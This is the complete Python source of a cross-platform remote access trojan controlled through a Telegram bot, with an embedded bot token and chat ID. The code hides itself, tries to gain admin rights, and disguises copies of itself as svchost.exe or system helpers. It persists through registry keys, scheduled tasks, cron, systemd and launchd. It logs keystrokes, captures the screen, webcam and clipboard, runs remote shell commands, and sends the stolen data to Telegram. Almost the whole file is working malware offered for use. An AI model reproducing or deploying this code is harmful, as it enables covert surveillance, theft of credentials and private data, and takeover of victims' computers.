# rat_crossplatform_advanced.py
# Fully advanced cross-platform RAT (Windows, Linux, macOS) with Telegram C2.
# Features: screenshots, webcam, keylogger, clipboard, remote shell, file upload/download,
# file browser, persistence (all OS), process list, kill process, system info, geolocation,
# lock screen (Windows only), shutdown/reboot (all OS), self-destruct, heartbeat.
# Auto-installs missing dependencies. Runs hidden (daemon on Unix, no console on Windows).
# Error logging to /tmp/rat_log.txt (Unix) or %TEMP%\rat_log.txt (Windows).

import os
import sys
import time
import json
import subprocess
import threading
import platform
import shutil
import tempfile
import base64
from datetime import datetime

# ---------- PLATFORM DETECTION ----------
IS_WINDOWS = platform.system() == "Windows"
IS_LINUX = platform.system() == "Linux"
IS_MAC = platform.system() == "Darwin"

# ---------- AUTO-ELEVATE (Windows only) ----------
def is_admin():
    if IS_WINDOWS:
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    else:
        return os.geteuid() == 0  # Unix

def elevate():
    if not is_admin():
        if IS_WINDOWS:
            try:
                import ctypes
                script = os.path.abspath(sys.argv[0])
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script, None, 1)
                sys.exit(0)
            except:
                pass
        else:
            # On Unix, try sudo via subprocess (may prompt)
            try:
                subprocess.run(['sudo', sys.executable] + sys.argv, check=False)
                sys.exit(0)
            except:
                pass

# ---------- DAEMONIZE (Unix) / HIDE CONSOLE (Windows) ----------
def daemonize():
    if IS_WINDOWS:
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    else:
        # Fork and detach
        try:
            if os.fork() > 0:
                os._exit(0)
            os.setsid()
            if os.fork() > 0:
                os._exit(0)
            os.umask(0)
            # Close stdin/out/err
            sys.stdin.close()
            sys.stdout.close()
            sys.stderr.close()
        except:
            pass

# ---------- AUTO-INSTALL DEPENDENCIES ----------
def install_package(pkg):
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", pkg], capture_output=True, timeout=120)
    except:
        pass

def safe_import(module_name, pip_name=None):
    if pip_name is None:
        pip_name = module_name
    try:
        return __import__(module_name)
    except ImportError:
        install_package(pip_name)
        try:
            return __import__(module_name)
        except ImportError:
            return None

# ---------- IMPORTS (cross-platform) ----------
requests = safe_import("requests")
PIL = safe_import("PIL", "Pillow")
# Screenshot: use pyscreenshot (cross-platform) or mss as fallback
pyscreenshot = safe_import("pyscreenshot")
if pyscreenshot is None:
    # Try mss
    mss = safe_import("mss")
    if mss is not None:
        def grab_screen():
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                return sct.grab(monitor)
    else:
        # Last resort: use PIL ImageGrab (Windows only) or subprocess scrot/import
        if IS_WINDOWS:
            from PIL import ImageGrab
            def grab_screen():
                return ImageGrab.grab()
        elif IS_LINUX or IS_MAC:
            def grab_screen():
                # Use scrot or import (ImageMagick) via subprocess
                temp_path = os.path.join(tempfile.gettempdir(), "scr.png")
                try:
                    if shutil.which("scrot"):
                        subprocess.run(["scrot", temp_path], check=True, timeout=5)
                        from PIL import Image
                        return Image.open(temp_path)
                    elif shutil.which("import"):
                        subprocess.run(["import", "-window", "root", temp_path], check=True, timeout=5)
                        from PIL import Image
                        return Image.open(temp_path)
                    else:
                        return None
                except:
                    return None
        else:
            def grab_screen():
                return None
else:
    def grab_screen():
        return pyscreenshot.grab()

# Webcam: OpenCV
cv2 = safe_import("cv2", "opencv-python")

# Keylogger: pynput
pynput = safe_import("pynput")

# Clipboard: pyperclip
pyperclip = safe_import("pyperclip")

# For persistence on Linux/macOS: crontab
cron = safe_import("croniter")  # not needed, we'll use subprocess

# ---------- TELEGRAM CREDENTIALS ----------
BOT_TOKEN = "8808768825:AAG46x-DBF4HVVujTELCDkW7jzUHDdcX0xY"
CHAT_ID   = "6504480358"
HEARTBEAT_INTERVAL = 30
heartbeat_running = True

# Logging
LOG_FILE = os.path.join(tempfile.gettempdir(), "rat_log.txt")
def log_error(msg):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"{datetime.now()}: {msg}\n")
    except:
        pass

# ---------- TELEGRAM WRAPPERS ----------
def tg_send_message(text):
    if requests is None:
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
    try:
        requests.post(url, data=payload, timeout=10)
    except Exception as e:
        log_error(f"tg_send: {e}")

def tg_send_photo(photo_path, caption=""):
    if requests is None or not os.path.exists(photo_path):
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    try:
        with open(photo_path, "rb") as f:
            files = {"photo": f}
            data = {"chat_id": CHAT_ID, "caption": caption}
            requests.post(url, files=files, data=data, timeout=15)
    except Exception as e:
        log_error(f"tg_photo: {e}")

def tg_send_document(file_path, caption=""):
    if requests is None or not os.path.exists(file_path):
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, "rb") as f:
            files = {"document": f}
            data = {"chat_id": CHAT_ID, "caption": caption}
            requests.post(url, files=files, data=data, timeout=15)
    except Exception as e:
        log_error(f"tg_doc: {e}")

def tg_get_updates(offset=None):
    if requests is None:
        return []
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    params = {"timeout": 30, "allowed_updates": ["message"]}
    if offset:
        params["offset"] = offset
    try:
        resp = requests.get(url, params=params, timeout=35)
        if resp.status_code == 200:
            return resp.json().get("result", [])
    except Exception as e:
        log_error(f"tg_get: {e}")
    return []

# ---------- CORE FUNCTIONS ----------
def take_screenshot():
    img = grab_screen()
    if img is None:
        return None
    temp_path = os.path.join(tempfile.gettempdir(), "scr.png")
    try:
        img.save(temp_path)
        return temp_path
    except:
        return None

def execute_cmd(command):
    try:
        proc = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW if IS_WINDOWS else 0
        )
        stdout, stderr = proc.communicate(timeout=60)
        output = stdout.decode("utf-8", errors="ignore") + stderr.decode("utf-8", errors="ignore")
        return output if output.strip() else "[Command executed with no output]"
    except Exception as e:
        log_error(f"cmd: {e}")
        return f"Error: {str(e)}"

def upload_file(local_path):
    if os.path.isfile(local_path):
        tg_send_document(local_path, f"File: {os.path.basename(local_path)}")
        return "File sent."
    return "File not found."

def download_file(url, save_path):
    if requests is None:
        return "Requests not available"
    try:
        r = requests.get(url, stream=True, timeout=30)
        with open(save_path, "wb") as f:
            for chunk in r.iter_content(1024):
                f.write(chunk)
        return f"Downloaded to {save_path}"
    except Exception as e:
        log_error(f"download: {e}")
        return f"Download failed: {str(e)}"

def get_system_info():
    import platform
    info = f"<b>Hostname:</b> {platform.node()}\n"
    info += f"<b>OS:</b> {platform.system()} {platform.release()}\n"
    info += f"<b>Arch:</b> {platform.machine()}\n"
    info += f"<b>User:</b> {os.getenv('USER') or os.getenv('USERNAME') or 'unknown'}\n"
    try:
        # Uptime
        if IS_WINDOWS:
            boot = os.popen('systeminfo | find "System Boot Time"').read().strip()
        else:
            boot = os.popen('uptime -p').read().strip()
        info += f"<b>Uptime:</b> {boot}\n"
    except:
        pass
    return info

def get_clipboard_text():
    if pyperclip is None:
        return "pyperclip not installed"
    try:
        return pyperclip.paste()
    except Exception as e:
        log_error(f"clipboard: {e}")
        return f"Clipboard error: {str(e)}"

# ---------- KEYLOGGER ----------
keylog_data = []
keylog_running = False
keylog_listener = None

def on_press(key):
    global keylog_data
    try:
        if hasattr(key, 'char') and key.char is not None:
            keylog_data.append(key.char)
        else:
            # Cross-platform special key mapping
            special = {
                'Key.space': ' ',
                'Key.enter': '\n',
                'Key.tab': '\t',
                'Key.backspace': '[BACKSPACE]',
                'Key.shift': '[SHIFT]',
                'Key.ctrl': '[CTRL]',
                'Key.alt': '[ALT]',
                'Key.cmd': '[WIN/CMD]',
                'Key.esc': '[ESC]',
                'Key.up': '[UP]',
                'Key.down': '[DOWN]',
                'Key.left': '[LEFT]',
                'Key.right': '[RIGHT]',
                'Key.f1': '[F1]',
                'Key.f2': '[F2]',
                'Key.f3': '[F3]',
                'Key.f4': '[F4]',
                'Key.f5': '[F5]',
                'Key.f6': '[F6]',
                'Key.f7': '[F7]',
                'Key.f8': '[F8]',
                'Key.f9': '[F9]',
                'Key.f10': '[F10]',
                'Key.f11': '[F11]',
                'Key.f12': '[F12]',
            }
            key_str = str(key)
            if key_str in special:
                keylog_data.append(special[key_str])
            else:
                keylog_data.append(f'[{key_str}]')
    except:
        pass

def start_keylogger():
    global keylog_running, keylog_listener, keylog_data
    if keylog_running:
        return "Keylogger already running."
    if pynput is None:
        return "pynput not installed."
    try:
        from pynput.keyboard import Listener
        keylog_data = []
        keylog_listener = Listener(on_press=on_press)
        keylog_listener.start()
        keylog_running = True
        return "Keylogger started."
    except Exception as e:
        log_error(f"start_keylogger: {e}")
        return f"Failed: {str(e)}"

def stop_keylogger():
    global keylog_running, keylog_listener, keylog_data
    if not keylog_running:
        return "Keylogger not running."
    try:
        if keylog_listener is not None:
            keylog_listener.stop()
            keylog_listener = None
        keylog_running = False
        log_path = os.path.join(tempfile.gettempdir(), "keylog.txt")
        with open(log_path, "w", encoding="utf-8") as f:
            f.write(''.join(keylog_data))
        tg_send_document(log_path, "Keylog dump")
        os.remove(log_path)
        keylog_data = []
        return "Keylogger stopped, log sent."
    except Exception as e:
        log_error(f"stop_keylogger: {e}")
        return f"Failed: {str(e)}"

# ---------- WEBCAM ----------
def capture_webcam():
    if cv2 is None:
        return None, "OpenCV not installed"
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None, "Cannot open webcam"
        ret, frame = cap.read()
        cap.release()
        if not ret:
            return None, "No frame"
        temp_path = os.path.join(tempfile.gettempdir(), "webcam.jpg")
        cv2.imwrite(temp_path, frame)
        return temp_path, None
    except Exception as e:
        log_error(f"webcam: {e}")
        return None, str(e)

# ---------- GEOLOCATION ----------
def get_location():
    if requests is None:
        return "Requests not available"
    try:
        resp = requests.get("https://ipinfo.io/json", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            return f"IP: {data.get('ip')}\nCity: {data.get('city')}\nRegion: {data.get('region')}\nCountry: {data.get('country')}\nLoc: {data.get('loc')}\nISP: {data.get('org')}"
        else:
            return "API error"
    except Exception as e:
        log_error(f"location: {e}")
        return f"Error: {str(e)}"

# ---------- FILE BROWSER ----------
def list_directory(path="."):
    try:
        items = os.listdir(path)
        result = []
        for item in items:
            full = os.path.join(path, item)
            if os.path.isdir(full):
                result.append(f"[DIR] {item}")
            else:
                size = os.path.getsize(full)
                result.append(f"[FILE] {item} ({size} bytes)")
        return "\n".join(result) if result else "Empty directory."
    except Exception as e:
        return f"Error: {str(e)}"

# ---------- PROCESS LIST ----------
def list_processes():
    if IS_WINDOWS:
        cmd = "tasklist"
    else:
        cmd = "ps -aux"
    return execute_cmd(cmd)

def kill_process(pid):
    try:
        if IS_WINDOWS:
            subprocess.run(["taskkill", "/PID", str(pid), "/F"], capture_output=True, timeout=10)
        else:
            os.kill(int(pid), 9)
        return f"Process {pid} killed."
    except Exception as e:
        return f"Failed: {str(e)}"

# ---------- LOCK SCREEN (Windows only) ----------
def lock_workstation():
    if IS_WINDOWS:
        try:
            import ctypes
            ctypes.windll.user32.LockWorkStation()
            return "Workstation locked."
        except Exception as e:
            return f"Lock failed: {str(e)}"
    else:
        return "Lock not supported on this OS."

# ---------- POPUP (Windows only) ----------
def show_popup(message):
    if IS_WINDOWS:
        try:
            import ctypes
            ctypes.windll.user32.MessageBoxW(0, message, "System Alert", 0x40 | 0x1)
            return "Popup displayed."
        except Exception as e:
            return f"Popup failed: {str(e)}"
    else:
        # Use notify-send on Linux, osascript on Mac
        try:
            if IS_LINUX:
                subprocess.run(["notify-send", "System Alert", message], timeout=5)
            elif IS_MAC:
                subprocess.run(["osascript", "-e", f'display alert "System Alert" message "{message}"'], timeout=5)
            return "Popup displayed (native notification)."
        except:
            return "Popup not supported."

# ---------- SHUTDOWN / REBOOT ----------
def shutdown_pc():
    try:
        if IS_WINDOWS:
            os.system("shutdown /s /t 0")
        else:
            os.system("shutdown -h now") if IS_LINUX else os.system("sudo shutdown -h now")
        return "Shutting down..."
    except Exception as e:
        return f"Failed: {str(e)}"

def reboot_pc():
    try:
        if IS_WINDOWS:
            os.system("shutdown /r /t 0")
        else:
            os.system("reboot") if IS_LINUX else os.system("sudo reboot")
        return "Rebooting..."
    except Exception as e:
        return f"Failed: {str(e)}"

# ---------- PERSISTENCE (cross-platform) ----------
def get_rat_path():
    # Copy itself to a hidden location per OS
    if IS_WINDOWS:
        dest_dir = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "System")
        dest = os.path.join(dest_dir, "svchost.exe")
    elif IS_LINUX:
        dest_dir = os.path.join(os.environ.get("HOME", ""), ".local", "bin")
        dest = os.path.join(dest_dir, "systemd-helper")
    else:  # macOS
        dest_dir = os.path.join(os.environ.get("HOME", ""), "Library", "Application Support", "com.apple.helper")
        dest = os.path.join(dest_dir, "helper")
    try:
        os.makedirs(dest_dir, exist_ok=True)
        src = sys.executable if getattr(sys, 'frozen', False) else __file__
        if os.path.abspath(src) != os.path.abspath(dest):
            shutil.copy2(src, dest)
            # Hide file on Windows
            if IS_WINDOWS:
                import ctypes
                ctypes.windll.kernel32.SetFileAttributesW(dest, 2)
            # On Unix, make executable
            else:
                os.chmod(dest, 0o755)
        return dest
    except Exception as e:
        log_error(f"copy_self: {e}")
        return sys.executable if getattr(sys, 'frozen', False) else __file__

def add_persistence():
    exe = get_rat_path()
    results = []
    if IS_WINDOWS:
        # Registry
        try:
            import winreg
            key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "WindowsUpdateService", 0, winreg.REG_SZ, exe)
            results.append("Registry (HKCU)")
        except:
            pass
        # Scheduled task
        try:
            subprocess.run(f'schtasks /create /tn "WindowsUpdateService" /tr "{exe}" /sc onlogon /ru SYSTEM /rl HIGHEST /f', shell=True, capture_output=True, timeout=10)
            results.append("Scheduled task")
        except:
            pass
        # Startup folder
        startup = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        if os.path.exists(startup):
            try:
                import pythoncom
                from win32com.client import Dispatch
                shell = Dispatch("WScript.Shell")
                shortcut = shell.CreateShortCut(os.path.join(startup, "WindowsUpdateService.lnk"))
                shortcut.TargetPath = exe
                shortcut.save()
                results.append("Startup folder")
            except:
                pass
    else:  # Unix
        # crontab @reboot
        try:
            cron_line = f"@reboot {exe} >/dev/null 2>&1"
            # Get existing crontab
            current = subprocess.run(["crontab", "-l"], capture_output=True, text=True, timeout=5)
            new_cron = current.stdout + "\n" + cron_line + "\n" if current.stdout else cron_line + "\n"
            subprocess.run(["crontab", "-"], input=new_cron, text=True, timeout=5)
            results.append("Cron @reboot")
        except:
            pass
        # systemd user service (Linux)
        if IS_LINUX:
            try:
                service_path = os.path.join(os.environ.get("HOME", ""), ".config", "systemd", "user", "helper.service")
                os.makedirs(os.path.dirname(service_path), exist_ok=True)
                service_content = f"""[Unit]
Description=Helper
After=network.target

[Service]
ExecStart={exe}
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
"""
                with open(service_path, "w") as f:
                    f.write(service_content)
                subprocess.run(["systemctl", "--user", "daemon-reload"], timeout=5)
                subprocess.run(["systemctl", "--user", "enable", "helper.service"], timeout=5)
                subprocess.run(["systemctl", "--user", "start", "helper.service"], timeout=5)
                results.append("systemd user service")
            except:
                pass
        # macOS launchd
        if IS_MAC:
            try:
                plist_path = os.path.join(os.environ.get("HOME", ""), "Library", "LaunchAgents", "com.helper.plist")
                plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.helper</string>
    <key>ProgramArguments</key>
    <array>
        <string>{exe}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
                with open(plist_path, "w") as f:
                    f.write(plist)
                subprocess.run(["launchctl", "load", plist_path], timeout=5)
                results.append("launchd")
            except:
                pass
    return "Persistence added: " + ", ".join(results) if results else "Persistence failed."

def remove_persistence():
    if IS_WINDOWS:
        try:
            import winreg
            for hive in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
                try:
                    with winreg.OpenKey(hive, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as regkey:
                        winreg.DeleteValue(regkey, "WindowsUpdateService")
                except:
                    pass
        except:
            pass
        subprocess.run('schtasks /delete /tn "WindowsUpdateService" /f', shell=True, capture_output=True)
        startup = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "WindowsUpdateService.lnk")
        if os.path.exists(startup):
            os.remove(startup)
    else:
        # Remove crontab lines
        try:
            current = subprocess.run(["crontab", "-l"], capture_output=True, text=True, timeout=5)
            lines = current.stdout.splitlines()
            new_lines = [line for line in lines if "helper" not in line and "svchost" not in line and "systemd-helper" not in line]
            subprocess.run(["crontab", "-"], input="\n".join(new_lines), text=True, timeout=5)
        except:
            pass
        if IS_LINUX:
            try:
                subprocess.run(["systemctl", "--user", "stop", "helper.service"], timeout=5)
                subprocess.run(["systemctl", "--user", "disable", "helper.service"], timeout=5)
                service_path = os.path.join(os.environ.get("HOME", ""), ".config", "systemd", "user", "helper.service")
                if os.path.exists(service_path):
                    os.remove(service_path)
                subprocess.run(["systemctl", "--user", "daemon-reload"], timeout=5)
            except:
                pass
        if IS_MAC:
            try:
                plist_path = os.path.join(os.environ.get("HOME", ""), "Library", "LaunchAgents", "com.helper.plist")
                if os.path.exists(plist_path):
                    subprocess.run(["launchctl", "unload", plist_path], timeout=5)
                    os.remove(plist_path)
            except:
                pass

# ---------- SELF-DESTRUCT ----------
def kill_self():
    global heartbeat_running
    heartbeat_running = False
    remove_persistence()
    try:
        if getattr(sys, 'frozen', False):
            os.remove(sys.executable)
    except:
        pass
    os._exit(0)

# ---------- HEARTBEAT ----------
def heartbeat_loop():
    while heartbeat_running:
        try:
            tg_send_message(f"🟢 <b>HEARTBEAT</b> - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        except:
            pass
        time.sleep(HEARTBEAT_INTERVAL)

# ---------- COMMAND PROCESSOR ----------
def process_command(cmd_text):
    cmd_text = cmd_text.strip()
    if not cmd_text:
        return "Empty command."
    parts = cmd_text.split(maxsplit=1)
    command = parts[0].lower()
    arg = parts[1] if len(parts) > 1 else ""

    if command == "/screenshot":
        path = take_screenshot()
        if path:
            tg_send_photo(path, "📸 Screenshot")
            os.remove(path)
            return "Screenshot sent."
        else:
            return "Screenshot failed."

    elif command == "/cmd":
        if not arg:
            return "Usage: /cmd <command>"
        output = execute_cmd(arg)
        if len(output) > 4000:
            output = output[:4000] + "\n...truncated"
        tg_send_message(f"<b>CMD output:</b>\n<code>{output}</code>")
        return "Command executed."

    elif command == "/upload":
        if not arg:
            return "Usage: /upload <path>"
        return upload_file(arg)

    elif command == "/download":
        if not arg:
            return "Usage: /download <URL> <save_path>"
        parts = arg.split(maxsplit=1)
        url = parts[0]
        save = parts[1] if len(parts)>1 else os.path.basename(url)
        return download_file(url, save)

    elif command == "/info":
        info = get_system_info()
        tg_send_message(info)
        return "Info sent."

    elif command == "/persist":
        result = add_persistence()
        tg_send_message(result)
        return result

    elif command == "/popup":
        if not arg:
            return "Usage: /popup <message>"
        result = show_popup(arg)
        tg_send_message(result)
        return result

    elif command == "/clipboard":
        text = get_clipboard_text()
        if len(text) > 4000:
            text = text[:4000] + "\n...truncated"
        tg_send_message(f"<b>Clipboard:</b>\n<code>{text}</code>")
        return "Clipboard sent."

    elif command == "/keylog_start":
        result = start_keylogger()
        tg_send_message(result)
        return result

    elif command == "/keylog_stop":
        result = stop_keylogger()
        tg_send_message(result)
        return result

    elif command == "/webcam":
        path, err = capture_webcam()
        if path:
            tg_send_photo(path, "📷 Webcam")
            os.remove(path)
            return "Webcam sent."
        else:
            return f"Webcam failed: {err}"

    elif command == "/location":
        loc = get_location()
        tg_send_message(f"<b>Location:</b>\n<code>{loc}</code>")
        return "Location sent."

    elif command == "/lock":
        result = lock_workstation()
        tg_send_message(result)
        return result

    elif command == "/shutdown":
        result = shutdown_pc()
        tg_send_message(result)
        return result

    elif command == "/reboot":
        result = reboot_pc()
        tg_send_message(result)
        return result

    elif command == "/ls":
        # List directory
        dir_path = arg if arg else "."
        result = list_directory(dir_path)
        if len(result) > 4000:
            result = result[:4000] + "\n...truncated"
        tg_send_message(f"<b>Directory listing:</b>\n<code>{result}</code>")
        return "Directory list sent."

    elif command == "/ps":
        result = list_processes()
        if len(result) > 4000:
            result = result[:4000] + "\n...truncated"
        tg_send_message(f"<b>Processes:</b>\n<code>{result}</code>")
        return "Process list sent."

    elif command == "/killproc":
        if not arg:
            return "Usage: /killproc <PID>"
        result = kill_process(arg.strip())
        tg_send_message(result)
        return result

    elif command == "/kill":
        kill_self()
        return "Killing..."  # won't be sent

    elif command == "/help":
        help_text = (
            "/screenshot - capture screen\n"
            "/cmd <command> - run shell command\n"
            "/upload <path> - send file to Telegram\n"
            "/download <URL> <path> - download file from URL\n"
            "/info - system info\n"
            "/persist - install persistence\n"
            "/popup <message> - show notification\n"
            "/clipboard - get clipboard text\n"
            "/keylog_start - start keylogger\n"
            "/keylog_stop - stop keylogger and send log\n"
            "/webcam - capture webcam image\n"
            "/location - get IP and geolocation\n"
            "/lock - lock workstation (Windows only)\n"
            "/shutdown - shutdown PC\n"
            "/reboot - reboot PC\n"
            "/ls [path] - list directory\n"
            "/ps - list processes\n"
            "/killproc <PID> - kill process\n"
            "/kill - self-destruct and exit"
        )
        tg_send_message(help_text)
        return "Help sent."

    else:
        return f"Unknown command: {command}"

# ---------- MAIN ----------
def main():
    elevate()
    daemonize()
    log_error("RAT started (cross-platform advanced)")
    # Attempt to add persistence if not already installed
    # Check if copy exists, if not, run persist
    if not os.path.exists(get_rat_path()):
        add_persistence()
    # Send online
    tg_send_message(f"🟢 <b>RAT ONLINE (Cross-Platform Advanced)</b> - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    # Heartbeat
    hb_thread = threading.Thread(target=heartbeat_loop, daemon=True)
    hb_thread.start()
    # Polling
    last_update_id = 0
    while True:
        try:
            updates = tg_get_updates(offset=last_update_id + 1)
            for upd in updates:
                if "message" in upd and "text" in upd["message"]:
                    msg = upd["message"]
                    if str(msg["chat"]["id"]) != CHAT_ID:
                        continue
                    text = msg["text"]
                    last_update_id = upd["update_id"]
                    threading.Thread(target=process_command, args=(text,), daemon=True).start()
                else:
                    last_update_id = upd["update_id"]
        except Exception as e:
            log_error(f"main loop error: {e}")
        time.sleep(1)

if __name__ == "__main__":
    main()
